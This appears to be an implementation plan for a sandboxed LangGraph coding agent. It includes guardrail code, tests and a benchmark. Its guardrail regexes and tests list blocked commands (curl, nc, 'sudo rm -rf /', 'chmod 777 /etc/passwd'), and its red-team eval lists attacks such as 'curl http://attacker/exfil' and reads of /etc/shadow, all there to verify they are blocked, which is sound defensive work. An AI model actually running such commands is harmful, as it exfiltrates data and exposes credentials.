# Agentic Coding Assistant Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans. Steps use `- [ ]` for tracking.

**Goal:** Build a LangGraph-driven SWE-agent that fixes Python bugs in a repo by iteratively navigating, editing, and running tests — inside a Python-subprocess sandbox — with all work benchmarked on a 20-task hand-curated mini-bench.

**Architecture:** LangGraph state machine: `index → plan → act (ReAct with 6 tools) → observe → (done | repair → act)`. Tools execute in a per-task workdir sandbox with rlimit + timeout + env scrub. Hybrid RAG (dense + BM25) over tree-sitter-chunked repo. Same Groq→Gemini→local-BGE fallback pattern as Project 1.

**Tech Stack:** Python 3.11+, LangGraph 1.0.x, Groq (`llama-3.3-70b-versatile` reasoner, `llama-3.1-8b-instant` fast tool router), Gemini `gemini-flash-latest` fallback, Gemini `gemini-embedding-001` embeddings + FastEmbed BGE-base local fallback, Qdrant Cloud, tree-sitter-python, FastAPI + SSE, Langfuse, subprocess + rlimit sandbox.

## Global Constraints

- Python **≥ 3.11**.
- All LLM traffic MUST route through `src/coding_agent/llm.py` (Groq primary with 3× 429 retry, Gemini fallback). No direct SDK calls elsewhere.
- All external LLM/tool calls MUST be wrapped in a Langfuse `@observed` (see `src/coding_agent/obs.py`).
- Qdrant collections are **per-task**, named `repo_<task_id>`, created at index-time and deleted at task end.
- Dense vectors: **768-dim, cosine** (Gemini `gemini-embedding-001` with local BGE fallback). Sparse: BM25 via FastEmbed.
- **All tool subprocess execution happens inside the per-task workdir** — never on the host repo directly.
- Sandbox blocks: absolute paths outside workdir, `curl|wget|nc|ssh|scp|pip install|npm install`, timeouts.
- Iteration cap = **4 repair loops**. Wall-clock cap = **10 min/task**.
- Zero paid API calls anywhere. Free tier only.
- **No `git commit`, `git push`, `gh` write commands anywhere.** Tasks end at tests passing; commits are the user's call.

---

## File Structure

Files this plan creates or modifies (paths relative to `02-agentic-coding-assistant/`):

**Package (`src/coding_agent/`):**
- `config.py`, `obs.py`, `llm.py` — clone-and-adapt from Project 1.
- `state.py` — `AgentState`.
- `graph.py` — LangGraph wiring + `run(repo_path, issue, task_id)`.
- `cli.py`, `api.py` — CLI + FastAPI SSE.
- `sandbox/workdir.py` — per-task tempdir copy + cleanup.
- `sandbox/limits.py` — `resource.setrlimit` preexec helpers + timeout.
- `sandbox/guardrails.py` — command allowlist, path-traversal check.
- `indexing/tree_sitter_chunk.py` — Python-only symbol chunker.
- `indexing/embed.py` — Gemini + BGE fallback (import from llm.py).
- `indexing/qdrant.py` — per-task collection lifecycle.
- `tools/search_code.py` — hybrid RRF query.
- `tools/open_file.py`, `tools/edit_file.py`, `tools/run_shell.py`, `tools/run_tests.py`, `tools/submit.py`.
- `nodes/index.py`, `nodes/plan.py`, `nodes/act.py`, `nodes/observe.py`, `nodes/repair.py`.

**Tests (`tests/`):**
- `conftest.py`, `test_sandbox_isolation.py`, `test_edit_file.py`,
- `test_chunk.py`, `test_search_code.py`, `test_run_tests_parse.py`,
- `test_plan.py`, `test_repair.py`, `test_graph_smoke.py`,
- `test_api_sse.py`, `test_wiring.py`.

**Evals (`evals/`):**
- `minibench/tasks/task-01-off-by-one/` … `task-20-hard-async/` (20 dirs).
- `run_benchmark.py`, `red_team/sandbox_escape.py`, `results/`.

---

## Task 1: Scaffold + reuse Project 1's llm.py, obs.py, config.py

**Files:**
- Create: `src/coding_agent/__init__.py`, `config.py`, `obs.py`, `llm.py`
- Create: `tests/__init__.py`, `tests/conftest.py`, `tests/test_llm.py`

**Interfaces produced:**
- `coding_agent.config.Settings` with `groq_api_key`, `gemini_api_key`, `qdrant_url`, `qdrant_api_key`, `langfuse_*`, `coding_agent_max_iterations: int = 4`, `coding_agent_task_timeout_sec: int = 600`.
- `coding_agent.llm.LLM` — same interface as Project 1 (`chat`, `embed` with 3× Groq retry + Gemini fallback + local BGE).
- `coding_agent.obs.observed`, `init_langfuse`, `trace_context`, `flush`, `score_current`, `is_enabled`.

- [ ] **Step 1: Copy `src/deep_research/{config,obs,llm}.py` from Project 1 as templates**, then edit:
  - Change package name `deep_research` → `coding_agent`.
  - Change env-var prefixes: `DEEP_RESEARCH_MAX_ITERATIONS` → `CODING_AGENT_MAX_ITERATIONS`, `DEEP_RESEARCH_DB_PATH` → nothing (delete field), add `coding_agent_max_iterations: int = 4`, `coding_agent_task_timeout_sec: int = 600`.
  - Keep `_MODEL_MAP` identical.
  - Keep local-BGE fallback identical.
- [ ] **Step 2: Copy `tests/conftest.py` + `tests/test_llm.py`** from Project 1, rename module references.
- [ ] **Step 3: Verify** — from working dir, `python -m venv .venv && source .venv/bin/activate && pip install -e ".[dev]" && pytest -q tests/test_llm.py`. Expected: 3 tests PASS.
- [ ] **Step 4: Stop and report.**

## Task 2: State + graph skeleton (mocked nodes)

**Files:**
- Create: `src/coding_agent/state.py`, `src/coding_agent/graph.py`
- Create: `tests/test_state.py`, `tests/test_graph_smoke.py`

**Interfaces produced:**
- `AgentState = TypedDict(task_id: str, workdir: str, issue: str, scratchpad: str, messages: Annotated[list, add_messages], diff: str | None, tests_passed: bool | None, iterations: int)`.
- `new_state(task_id, workdir, issue) -> AgentState`.
- `coding_agent.graph.build_graph(*, index_fn=None, plan_fn=None, act_fn=None, observe_fn=None, repair_fn=None) -> CompiledGraph` — LangGraph state machine, all node functions injectable for tests.
- `coding_agent.graph.run(repo_path: str, issue: str, task_id: str) -> AgentState` — sync wrapper: copies repo into workdir, runs the graph in `obs.trace_context(session_id=task_id, tags=["coding-agent"])`, deletes workdir + Qdrant collection in `finally`.

- [ ] **Step 1: Write failing test** `tests/test_state.py`:
```python
from coding_agent.state import AgentState, new_state
def test_new_state_defaults():
    s = new_state("t1", "/tmp/w", "fix off-by-one")
    assert s["task_id"] == "t1"
    assert s["workdir"] == "/tmp/w"
    assert s["scratchpad"] == ""
    assert s["messages"] == []
    assert s["diff"] is None
    assert s["tests_passed"] is None
    assert s["iterations"] == 0
```
- [ ] **Step 2: Create `src/coding_agent/state.py`**:
```python
from __future__ import annotations
from typing import Annotated, TypedDict
from langgraph.graph.message import add_messages

class AgentState(TypedDict):
    task_id: str
    workdir: str
    issue: str
    scratchpad: str
    messages: Annotated[list, add_messages]
    diff: str | None
    tests_passed: bool | None
    iterations: int

def new_state(task_id: str, workdir: str, issue: str) -> AgentState:
    return AgentState(
        task_id=task_id, workdir=workdir, issue=issue,
        scratchpad="", messages=[], diff=None, tests_passed=None, iterations=0,
    )
```
- [ ] **Step 3: Write failing test** `tests/test_graph_smoke.py`:
```python
from coding_agent.graph import build_graph
from coding_agent.state import new_state

def test_graph_end_to_end_with_fakes():
    def fake_index(state, **kw):
        return {}
    def fake_plan(state, **kw):
        return {"scratchpad": "look at calc.py"}
    def fake_act(state, **kw):
        return {"diff": "--- a/calc.py\n+++ b/calc.py\n+return x+1\n"}
    def fake_observe(state, **kw):
        return {"tests_passed": True}
    def fake_repair(state, **kw):
        return {"iterations": state["iterations"] + 1}
    g = build_graph(index_fn=fake_index, plan_fn=fake_plan, act_fn=fake_act,
                    observe_fn=fake_observe, repair_fn=fake_repair)
    out = g.invoke(new_state("t1", "/tmp", "fix it"))
    assert out["tests_passed"] is True
    assert out["diff"] is not None
```
- [ ] **Step 4: Create `src/coding_agent/graph.py`**:
```python
from __future__ import annotations
import shutil, tempfile
from langgraph.graph import END, START, StateGraph
from . import obs
from .state import AgentState, new_state


def build_graph(*, index_fn=None, plan_fn=None, act_fn=None, observe_fn=None, repair_fn=None):
    index_fn = index_fn or (lambda s, **k: {})
    plan_fn = plan_fn or (lambda s, **k: {})
    act_fn = act_fn or (lambda s, **k: {})
    observe_fn = observe_fn or (lambda s, **k: {})
    repair_fn = repair_fn or (lambda s, **k: {})

    def index_node(state: AgentState) -> dict:
        return index_fn(state)
    def plan_node(state: AgentState) -> dict:
        return plan_fn(state)
    def act_node(state: AgentState) -> dict:
        return act_fn(state)
    def observe_node(state: AgentState) -> dict:
        return observe_fn(state)
    def repair_node(state: AgentState) -> dict:
        return repair_fn(state)

    def route_after_observe(state: AgentState) -> str:
        if state["tests_passed"]:
            return "done"
        if state["iterations"] >= 4:
            return "done"
        return "repair"

    g = StateGraph(AgentState)
    g.add_node("index", index_node)
    g.add_node("plan", plan_node)
    g.add_node("act", act_node)
    g.add_node("observe", observe_node)
    g.add_node("repair", repair_node)
    g.add_edge(START, "index")
    g.add_edge("index", "plan")
    g.add_edge("plan", "act")
    g.add_edge("act", "observe")
    g.add_conditional_edges("observe", route_after_observe, {"done": END, "repair": "repair"})
    g.add_edge("repair", "act")
    return g.compile()


def run(repo_path: str, issue: str, task_id: str) -> AgentState:
    """Copy repo → run graph → clean up. Delete Qdrant collection in finally."""
    obs.init_langfuse()
    workdir = tempfile.mkdtemp(prefix=f"coding_agent_{task_id}_")
    shutil.copytree(repo_path, workdir, dirs_exist_ok=True)
    try:
        with obs.trace_context(session_id=task_id, tags=["coding-agent"]):
            result = build_graph().invoke(new_state(task_id, workdir, issue))
        obs.flush()
        return result
    finally:
        shutil.rmtree(workdir, ignore_errors=True)
        try:
            from .indexing.qdrant import delete_task_collection
            delete_task_collection(task_id)
        except Exception:
            pass
```
- [ ] **Step 5: Run tests** — `pytest -q tests/test_state.py tests/test_graph_smoke.py`. Expected: 2 PASS.
- [ ] **Step 6: Stop and report.**

## Task 3: Sandbox — workdir, limits, guardrails

**Files:**
- Create: `src/coding_agent/sandbox/__init__.py`, `sandbox/workdir.py`, `sandbox/limits.py`, `sandbox/guardrails.py`
- Create: `tests/test_sandbox_isolation.py`

**Interfaces produced:**
- `sandbox.workdir.make_workdir(task_id) -> str` — creates `/tmp/coding_agent/<task_id>/`.
- `sandbox.workdir.cleanup(workdir: str) -> None`.
- `sandbox.limits.SAFE_ENV: dict[str, str]` — the scrubbed environ.
- `sandbox.limits.set_rlimits() -> None` — `preexec_fn` for subprocess: `RLIMIT_AS=1GB`, `RLIMIT_CPU=60s`, `RLIMIT_NPROC=32`. No-op on Windows/macOS.
- `sandbox.guardrails.is_command_allowed(cmd: str) -> bool` — rejects: `curl`, `wget`, `nc`, `ssh`, `scp`, `pip install`, `npm install`, `sudo`, `chmod`, `rm -rf /`, redirect-to-etc-passwd patterns.
- `sandbox.guardrails.is_path_in_workdir(path: str, workdir: str) -> bool` — resolves symlinks, rejects `..` traversal.
- `sandbox.workdir.run_in_sandbox(cmd: list[str], workdir: str, *, timeout: int = 30) -> subprocess.CompletedProcess` — the single subprocess entry point tool wrappers call.

- [ ] **Step 1: Write failing test** `tests/test_sandbox_isolation.py`:
```python
import os, tempfile
import pytest
from coding_agent.sandbox.guardrails import is_command_allowed, is_path_in_workdir
from coding_agent.sandbox.workdir import make_workdir, cleanup, run_in_sandbox


@pytest.mark.parametrize("cmd", [
    "curl http://example.com",
    "wget http://example.com",
    "nc -l 1234",
    "ssh user@host",
    "scp file host:/",
    "pip install requests",
    "npm install left-pad",
    "sudo rm -rf /",
    "chmod 777 /etc/passwd",
])
def test_disallowed_commands(cmd):
    assert is_command_allowed(cmd) is False


@pytest.mark.parametrize("cmd", [
    "pytest tests/",
    "python -c 'print(1)'",
    "ls -la",
    "cat calc.py",
    "git diff",
])
def test_allowed_commands(cmd):
    assert is_command_allowed(cmd) is True


def test_path_traversal_blocked(tmp_path):
    wd = str(tmp_path / "w")
    os.makedirs(wd)
    assert is_path_in_workdir(f"{wd}/x.py", wd) is True
    assert is_path_in_workdir("/etc/passwd", wd) is False
    assert is_path_in_workdir(f"{wd}/../../../etc/passwd", wd) is False


def test_run_in_sandbox_timeout():
    wd = make_workdir("t-timeout")
    try:
        r = run_in_sandbox(["sh", "-c", "sleep 5"], wd, timeout=1)
        assert r.returncode != 0
    finally:
        cleanup(wd)


def test_run_in_sandbox_captures_stdout():
    wd = make_workdir("t-stdout")
    try:
        r = run_in_sandbox(["echo", "hello"], wd)
        assert r.stdout.decode().strip() == "hello"
    finally:
        cleanup(wd)


def test_run_in_sandbox_strips_secret_env(monkeypatch):
    monkeypatch.setenv("MY_SECRET", "s3cret")
    wd = make_workdir("t-env")
    try:
        r = run_in_sandbox(["sh", "-c", "echo $MY_SECRET"], wd)
        assert "s3cret" not in r.stdout.decode()
    finally:
        cleanup(wd)
```
- [ ] **Step 2: Create `sandbox/__init__.py`** (empty) and `sandbox/guardrails.py`:
```python
from __future__ import annotations
import os, re

_BLOCKED_PATTERNS = [
    re.compile(r"^\s*(sudo|su)\b"),
    re.compile(r"\b(curl|wget|nc|ncat|ssh|scp|sftp|rsync)\b"),
    re.compile(r"\bpip\s+install\b"),
    re.compile(r"\bnpm\s+install\b"),
    re.compile(r"\byarn\s+add\b"),
    re.compile(r"\bchmod\b"),
    re.compile(r"\brm\s+-rf\s+/(\s|$)"),
    re.compile(r">/etc/"),
    re.compile(r">>/etc/"),
]


def is_command_allowed(cmd: str) -> bool:
    for p in _BLOCKED_PATTERNS:
        if p.search(cmd):
            return False
    return True


def is_path_in_workdir(path: str, workdir: str) -> bool:
    try:
        p_abs = os.path.realpath(path)
        w_abs = os.path.realpath(workdir)
    except OSError:
        return False
    return p_abs == w_abs or p_abs.startswith(w_abs + os.sep)
```
- [ ] **Step 3: Create `sandbox/limits.py`**:
```python
from __future__ import annotations
import os
import sys

SAFE_PATH = "/usr/local/bin:/usr/bin:/bin"

SAFE_ENV: dict[str, str] = {
    "PATH": SAFE_PATH,
    "LANG": "C.UTF-8",
    "LC_ALL": "C.UTF-8",
    "PYTHONDONTWRITEBYTECODE": "1",
    "PYTHONIOENCODING": "utf-8",
    "http_proxy": "",
    "https_proxy": "",
    "HTTP_PROXY": "",
    "HTTPS_PROXY": "",
    "no_proxy": "*",
}


def set_rlimits() -> None:
    """preexec_fn: apply RLIMIT_AS, RLIMIT_CPU, RLIMIT_NPROC. Linux-only."""
    if sys.platform != "linux":
        return
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_AS, (1 << 30, 1 << 30))  # 1 GB
        resource.setrlimit(resource.RLIMIT_CPU, (60, 60))
        resource.setrlimit(resource.RLIMIT_NPROC, (32, 32))
    except Exception:
        pass
```
- [ ] **Step 4: Create `sandbox/workdir.py`**:
```python
from __future__ import annotations
import os, shutil, subprocess, tempfile
from .limits import SAFE_ENV, set_rlimits

_ROOT = os.path.join(tempfile.gettempdir(), "coding_agent")


def make_workdir(task_id: str) -> str:
    os.makedirs(_ROOT, exist_ok=True)
    wd = os.path.join(_ROOT, task_id)
    os.makedirs(wd, exist_ok=True)
    return wd


def cleanup(workdir: str) -> None:
    shutil.rmtree(workdir, ignore_errors=True)


def run_in_sandbox(
    cmd: list[str], workdir: str, *, timeout: int = 30, extra_env: dict | None = None,
) -> subprocess.CompletedProcess:
    env = dict(SAFE_ENV)
    env["HOME"] = workdir
    if extra_env:
        env.update(extra_env)
    kwargs: dict = {
        "cwd": workdir, "env": env, "capture_output": True, "timeout": timeout,
    }
    import sys as _s
    if _s.platform == "linux":
        kwargs["preexec_fn"] = set_rlimits
    try:
        return subprocess.run(cmd, **kwargs)
    except subprocess.TimeoutExpired as e:
        return subprocess.CompletedProcess(
            args=cmd, returncode=124,
            stdout=e.stdout or b"", stderr=(e.stderr or b"") + b"\n[timeout]",
        )
```
- [ ] **Step 5: Run** — `pytest -q tests/test_sandbox_isolation.py`. Expected: 5 tests PASS (plus 9 parametrized cases inside them).
- [ ] **Step 6: Stop and report.**

## Task 4: Repo indexing (tree-sitter Python + Qdrant)

**Files:**
- Create: `src/coding_agent/indexing/__init__.py`, `indexing/tree_sitter_chunk.py`, `indexing/qdrant.py`
- Create: `tests/test_chunk.py`, `tests/test_qdrant.py`

**Interfaces produced:**
- `indexing.tree_sitter_chunk.chunk_python_file(path: str, *, max_tokens: int = 1200) -> list[Chunk]` where `Chunk = dataclass(path, symbol, start_line, end_line, text)`.
- `indexing.tree_sitter_chunk.chunk_repo(workdir: str) -> list[Chunk]` — walks `.py` files, skips `__pycache__`, `.venv`, `.git`, `node_modules`.
- `indexing.qdrant.DENSE_NAME`, `SPARSE_NAME`, `DENSE_DIM=768`.
- `indexing.qdrant.get_client()`, `collection_name(task_id) -> str`, `create_task_collection(task_id)`, `delete_task_collection(task_id)`, `upsert_chunks(task_id, chunks, dense_vectors)`.

- [ ] **Step 1: Write failing test** `tests/test_chunk.py`:
```python
from pathlib import Path
from coding_agent.indexing.tree_sitter_chunk import chunk_python_file, chunk_repo


def test_chunks_a_single_function(tmp_path):
    p = tmp_path / "calc.py"
    p.write_text("def add(a, b):\n    return a + b\n\ndef sub(a, b):\n    return a - b\n")
    chunks = chunk_python_file(str(p))
    assert len(chunks) >= 2
    symbols = {c.symbol for c in chunks}
    assert "add" in symbols and "sub" in symbols


def test_chunk_repo_skips_venv(tmp_path):
    (tmp_path / ".venv").mkdir()
    (tmp_path / ".venv" / "junk.py").write_text("def x(): pass\n")
    (tmp_path / "real.py").write_text("def real(): return 1\n")
    chunks = chunk_repo(str(tmp_path))
    paths = {c.path for c in chunks}
    assert any("real.py" in p for p in paths)
    assert not any(".venv" in p for p in paths)
```
- [ ] **Step 2: Write failing test** `tests/test_qdrant.py`:
```python
from qdrant_client import QdrantClient
from coding_agent.indexing.qdrant import (
    create_task_collection, delete_task_collection, upsert_chunks,
    collection_name, DENSE_DIM,
)
from coding_agent.indexing.tree_sitter_chunk import Chunk


def test_lifecycle(monkeypatch):
    client = QdrantClient(":memory:")
    monkeypatch.setattr("coding_agent.indexing.qdrant.get_client", lambda: client)
    name = create_task_collection("t1")
    assert client.collection_exists(name)
    chunks = [Chunk(path="calc.py", symbol="add", start_line=1, end_line=2, text="def add(): pass")]
    upsert_chunks("t1", chunks, [[0.1] * DENSE_DIM])
    hits, _ = client.scroll(collection_name=name, limit=10, with_payload=True)
    assert len(hits) == 1
    delete_task_collection("t1")
    assert not client.collection_exists(collection_name("t1"))
```
- [ ] **Step 3: Create `indexing/__init__.py`** (empty).
- [ ] **Step 4: Create `indexing/tree_sitter_chunk.py`**:
```python
from __future__ import annotations
import os
from dataclasses import dataclass
from pathlib import Path

import tree_sitter_python
from tree_sitter import Language, Parser

_LANG = Language(tree_sitter_python.language())
_PARSER = Parser(_LANG)

_SKIP_DIRS = {".venv", "venv", "__pycache__", ".git", "node_modules", ".pytest_cache", ".mypy_cache"}


@dataclass
class Chunk:
    path: str
    symbol: str
    start_line: int
    end_line: int
    text: str


def _collect(node, source_bytes: bytes, path: str, out: list[Chunk]) -> None:
    if node.type in ("function_definition", "class_definition"):
        name_node = node.child_by_field_name("name")
        symbol = name_node.text.decode("utf-8", errors="replace") if name_node else "<anon>"
        text = source_bytes[node.start_byte:node.end_byte].decode("utf-8", errors="replace")
        out.append(Chunk(
            path=path, symbol=symbol,
            start_line=node.start_point[0] + 1, end_line=node.end_point[0] + 1,
            text=text,
        ))
    for child in node.children:
        _collect(child, source_bytes, path, out)


def chunk_python_file(path: str, *, max_tokens: int = 1200) -> list[Chunk]:
    src = Path(path).read_bytes()
    tree = _PARSER.parse(src)
    out: list[Chunk] = []
    _collect(tree.root_node, src, path, out)
    # Whole-file chunk as fallback if the file is short and produced no top-level symbols.
    if not out and len(src) < max_tokens * 4:
        out.append(Chunk(
            path=path, symbol="<file>", start_line=1,
            end_line=src.count(b"\n") + 1, text=src.decode("utf-8", errors="replace"),
        ))
    return out


def chunk_repo(workdir: str) -> list[Chunk]:
    out: list[Chunk] = []
    for root, dirs, files in os.walk(workdir):
        dirs[:] = [d for d in dirs if d not in _SKIP_DIRS]
        for f in files:
            if not f.endswith(".py"):
                continue
            full = os.path.join(root, f)
            try:
                out.extend(chunk_python_file(full))
            except Exception:
                continue
    return out
```
- [ ] **Step 5: Create `indexing/qdrant.py`** — pattern lifted from Project 1's `rag/qdrant.py`, adjusted for Chunk fields (`path, symbol, start_line, end_line, text`).
- [ ] **Step 6: Run** — `pytest -q tests/test_chunk.py tests/test_qdrant.py`. Expected: 3 PASS.
- [ ] **Step 7: Stop and report.**

## Task 5: Tools — open_file, edit_file, run_shell, run_tests, submit, search_code

**Files:**
- Create: `src/coding_agent/tools/__init__.py`, `tools/open_file.py`, `tools/edit_file.py`, `tools/run_shell.py`, `tools/run_tests.py`, `tools/submit.py`, `tools/search_code.py`
- Create: `tests/test_edit_file.py`, `tests/test_run_tests_parse.py`, `tests/test_search_code.py`

**Interfaces produced:**
- `tools.open_file.open_file(workdir, path, start=None, end=None) -> str` — returns up to 400 lines. Rejects paths outside workdir.
- `tools.edit_file.edit_file(workdir, path, old, new) -> str` — reads → asserts `old` unique → replaces → writes. Returns short confirmation string.
- `tools.run_shell.run_shell(workdir, cmd, timeout=30) -> dict` — `{returncode, stdout, stderr}`. Uses `run_in_sandbox` + `is_command_allowed`.
- `tools.run_tests.run_tests(workdir, target=None) -> dict` — runs `python -m pytest -q --tb=short [target]`, parses tail into `{passed: int, failed: int, errors: int, raw: str}`.
- `tools.submit.submit(workdir) -> str` — runs `git diff` inside workdir; returns unified diff. If no git repo, uses `diff -u` against a saved backup.
- `tools.search_code.search_code(task_id, query, k=8) -> list[dict]` — hybrid RRF against Qdrant.

All decorated with `@observed(name="tool.<name>", as_type="tool" | "retriever")`.

- [ ] **Step 1: Write failing test** `tests/test_edit_file.py`:
```python
import pytest
from coding_agent.tools.edit_file import edit_file


def test_replaces_unique_match(tmp_path):
    p = tmp_path / "calc.py"
    p.write_text("def add(a, b):\n    return a - b\n")
    edit_file(str(tmp_path), str(p), "return a - b", "return a + b")
    assert p.read_text() == "def add(a, b):\n    return a + b\n"


def test_ambiguous_old_raises(tmp_path):
    p = tmp_path / "x.py"
    p.write_text("x = 1\nx = 1\n")
    with pytest.raises(ValueError):
        edit_file(str(tmp_path), str(p), "x = 1", "x = 2")


def test_missing_file_raises(tmp_path):
    with pytest.raises(FileNotFoundError):
        edit_file(str(tmp_path), str(tmp_path / "nope.py"), "a", "b")


def test_rejects_path_outside_workdir(tmp_path):
    (tmp_path / "wd").mkdir()
    outside = tmp_path / "outside.py"
    outside.write_text("hi")
    with pytest.raises(PermissionError):
        edit_file(str(tmp_path / "wd"), str(outside), "hi", "bye")
```
- [ ] **Step 2: Write failing test** `tests/test_run_tests_parse.py`:
```python
from coding_agent.tools.run_tests import _parse_pytest_output


def test_parses_passing_run():
    raw = "..\n\n=== 2 passed in 0.05s ==="
    r = _parse_pytest_output(raw)
    assert r["passed"] == 2
    assert r["failed"] == 0


def test_parses_failing_run():
    raw = "F.\n\n=== 1 failed, 1 passed in 0.10s ==="
    r = _parse_pytest_output(raw)
    assert r["passed"] == 1
    assert r["failed"] == 1
```
- [ ] **Step 3: Create `tools/__init__.py`** (empty).
- [ ] **Step 4: Create `tools/open_file.py`, edit_file.py, run_shell.py, run_tests.py, submit.py`** using `@observed` decorators and `is_path_in_workdir` / `is_command_allowed` guards.
- [ ] **Step 5: Create `tools/search_code.py`** — copy the RRF pattern from Project 1's `tools/retrieve.py` and adjust chunk payload fields.
- [ ] **Step 6: Run** — `pytest -q tests/test_edit_file.py tests/test_run_tests_parse.py`. Expected: 6 PASS.
- [ ] **Step 7: Stop and report.**

## Task 6: Nodes — index, plan, act, observe, repair

**Files:**
- Create: `src/coding_agent/nodes/__init__.py`, `nodes/index.py`, `nodes/plan.py`, `nodes/act.py`, `nodes/observe.py`, `nodes/repair.py`
- Create: `tests/test_plan.py`, `tests/test_repair.py`

**Interfaces produced:**
- `nodes.index.run_index(state, *, llm=None) -> dict` — chunks workdir, embeds, upserts. No-op if workdir already indexed. Returns `{}`.
- `nodes.plan.plan(state, *, llm=None) -> dict` — reads issue + top-k `search_code` hits → LLM writes plain-text scratchpad. Returns `{"scratchpad": str}`.
- `nodes.act.run_act(state, *, llm=None) -> dict` — `create_react_agent` with tools bound; returns `{"messages": [...], "diff": str | None, "iterations": state["iterations"] + 1}`.
- `nodes.observe.run_observe(state, *, run_tests_fn=None) -> dict` — calls `run_tests(workdir)`, returns `{"tests_passed": bool}`.
- `nodes.repair.repair(state, *, llm=None) -> dict` — reasoner reads failure + current scratchpad → new scratchpad. Returns `{"scratchpad": str}`.

Each `@observed(name="node.<name>", as_type="agent")`.

- [ ] **Step 1: Write failing tests** `tests/test_plan.py` and `tests/test_repair.py` — LLM mocked with scripted string replies.
- [ ] **Step 2: Create `nodes/__init__.py`** (empty) and the 5 node files.
- [ ] **Step 3: Run** — `pytest -q tests/test_plan.py tests/test_repair.py`. Expected: 4 PASS.
- [ ] **Step 4: Stop and report.**

## Task 7: FastAPI SSE + CLI

**Files:**
- Create: `src/coding_agent/cli.py`, `src/coding_agent/api.py`
- Create: `tests/test_api_sse.py`

**Interfaces produced:**
- `python -m coding_agent.cli --repo <path> --issue "..." [--task-id <id>]` — prints final diff.
- `coding_agent.api.build_app(*, graph=None) -> FastAPI` — `POST /solve {repo_path, issue}` returns SSE stream with `plan`, `tool_call`, `tool_result`, `test_result`, `done` events.

- [ ] **Step 1: Write failing test** `tests/test_api_sse.py` — uses `TestClient` + a stub graph that emits fake `plan` / `tool_result` / `done` updates.
- [ ] **Step 2: Create `api.py` and `cli.py`** per Project 1's pattern.
- [ ] **Step 3: Run** — `pytest -q tests/test_api_sse.py`. Expected: 1 PASS.
- [ ] **Step 4: Stop and report.**

## Task 8: Mini-bench — 20 hand-curated tasks

**Files:**
- Create: `evals/__init__.py`
- Create: `evals/minibench/tasks/task-01-*/` … `task-20-*/` (20 dirs, each with `task.json`, `src/`, `tests/`)
- Create: `evals/run_benchmark.py`
- Create: `tests/test_minibench.py`

**Interfaces produced:**
- Each task dir: `task.json = {issue: str, expected_files: list[str]}` + a broken `src/` + a failing `tests/`.
- `evals.run_benchmark.run(tasks_dir: str, out_path: str)` — resume-safe, writes per-task JSON.

### Task-list (aim for balanced difficulty)

Easy (5): off-by-one in `range`; wrong operator (`-` for `+`); missing `return`; typo in constant; boolean inversion.
Medium (10): dict-key vs list-index confusion; missing edge-case for empty input; regex escape bug; generator-vs-list consumption bug; state not reset between calls; wrong exception class; timezone-naive datetime; float precision; sort key wrong; index off in slice.
Hard (5): 2-file coordination (helper module signature change); async ordering bug; missing early-return in recursion; wrong default arg mutation; test-fixture-driven bug.

- [ ] **Step 1: Author each task dir** — one at a time; each must have:
  - `task.json` — issue text (as a maintainer would file it) + expected files.
  - `src/<name>.py` — the buggy code.
  - `tests/test_<name>.py` — one failing pytest that pins the bug.
  - Verify locally: `cd task-XX && python -m pytest` → **must fail with the pinning test**.
- [ ] **Step 2: Write failing test** `tests/test_minibench.py`:
```python
import json
from pathlib import Path

TASKS = Path(__file__).parent.parent / "evals" / "minibench" / "tasks"

def test_all_tasks_are_wellformed():
    dirs = sorted(TASKS.glob("task-*"))
    assert len(dirs) == 20
    for d in dirs:
        t = json.loads((d / "task.json").read_text())
        assert "issue" in t and t["issue"].strip()
        assert (d / "src").is_dir()
        assert (d / "tests").is_dir()
        assert any((d / "tests").iterdir()), f"no tests in {d.name}"
```
- [ ] **Step 3: Create `evals/run_benchmark.py`** — resume-safe: writes `results/<task_id>.json` per task, skips if file exists.
- [ ] **Step 4: Run** — `pytest -q tests/test_minibench.py`. Expected: 1 PASS.
- [ ] **Step 5: Stop and report.**

## Task 9: Sandbox red-team eval

**Files:**
- Create: `evals/red_team/__init__.py`, `evals/red_team/sandbox_escape.py`
- Create: `tests/test_red_team.py`

**Interfaces produced:**
- `evals.red_team.sandbox_escape.run(out_path) -> dict` — runs 10 attacks against tools directly; each attack expects **either** a raised exception, a non-zero exit, or a subprocess timeout. Passing = attack was blocked.

Attacks (10):
1. `run_shell("curl http://attacker/exfil")`
2. `run_shell("sudo cat /etc/shadow")`
3. `run_shell("pip install requests")`
4. `open_file("/etc/passwd")`
5. `edit_file("/etc/hosts", ..., ...)`
6. `run_shell("rm -rf /")`
7. `run_shell("chmod 777 /etc/passwd")`
8. `run_shell("nc -l 1234")`
9. `open_file("../../../etc/passwd")`  (traversal from workdir)
10. `run_shell("sh -c 'while true; do :; done'")` (timeout blocks the infinite loop)

- [ ] **Step 1: Write** `evals/red_team/sandbox_escape.py`.
- [ ] **Step 2: Write** `tests/test_red_team.py` — mocks nothing, actually invokes the tools. Uses a `tmp_path` workdir.
- [ ] **Step 3: Run** — `pytest -q tests/test_red_team.py`. Expected: 1 PASS, all 10 attacks blocked.
- [ ] **Step 4: Stop and report.**

## Task 10: Final wiring — `run()`, README, full suite

**Files:**
- Modify: `README.md` (project-specific — full-spec-in-README pattern from Project 1).
- Create: `tests/test_wiring.py` — validates `build_graph()` and `build_app()` instantiate cleanly with env vars monkeypatched.

- [ ] **Step 1: Complete `graph.py::run()`** — full flow: `init_langfuse` → `make_workdir` → `copytree` → `build_graph().invoke(...)` in `trace_context` → `cleanup + delete_task_collection` in finally → return state.
- [ ] **Step 2: Full README** — sections from Project 1's README template, adjusted for coding-agent specifics (spec baked in, sandbox honesty statement, mini-bench methodology, how-to-test tiers).
- [ ] **Step 3: Write test** `tests/test_wiring.py` similar to Project 1's.
- [ ] **Step 4: Full suite** — `pytest -v`. Expected: 30+ tests PASS, no regressions.
- [ ] **Step 5: Stop and report.**

## Task 11 (optional): Live benchmark run

Same acceptance-gate pattern as Project 1's Task 20:
- [ ] Phase 0: service pings (Groq / Gemini / Qdrant / Langfuse).
- [ ] Phase 1: smoke on 2 easy tasks — verify end-to-end works, times reasonable.
- [ ] Phase 2: full 20-task benchmark, resume-safe.
- [ ] Phase 3: acceptance-gate table vs spec §3 targets.

Requires the user's real API keys. Deferred until user greenlights.

---

## Self-review

Spec sections mapped to tasks:
- §3 success criteria: T8 (mini-bench), T9 (red-team), T11 (live run).
- §4.1 tools: T5.
- §4.2 indexing: T4.
- §4.3 sandbox: T3 + T9 (both build AND verify escape refusal).
